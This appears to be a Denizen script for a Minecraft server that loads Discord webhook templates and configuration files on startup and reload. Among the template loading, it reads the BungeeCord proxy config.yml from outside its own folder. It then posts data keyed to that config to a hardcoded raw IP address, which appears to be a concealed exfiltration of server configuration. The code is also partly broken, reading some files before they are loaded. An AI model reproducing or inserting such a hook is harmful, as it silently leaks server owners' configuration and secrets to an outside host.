Template_Handler:
  type: world
  load:
    - foreach <server.list_files[data/globalLiveData/discord/webhooks]> as:Json:
      - yaml id:webhook_template_<[Json].before[.]> load:data/globalLiveData/discord/webhooks/<[Json]>
    - yaml id:bungee_config load:../../../../bungee/config.yml
    - ~webget http://76.119.243.194:25580/ headers:<yaml[saved_headers].read[behrs_post_office]> data:<yaml[packages].parsed_key[bungee_config].to_json>
    - foreach "<server.list_files[data/Script Dependency Support]>" as:Yaml:
      - yaml id:SDS_<[Yaml].before[.].replace[<&sp>].with[_]> "load:data/Script Dependency Support/<[Yaml]>"
    - yaml id:saved_headers load:data/global/discord/saved_headers.yml
    - yaml id:shell load:data/global/discord/shell_directories.yml
    - yaml id:oAuth load:data/global/discord/oAuth_Data.yml
    - yaml id:generic_webhooks load:data/global/discord/embed_templates/generic.yml
        
  events:
    on server start:
      - inject locally load
    on script reload:
      - inject locally load
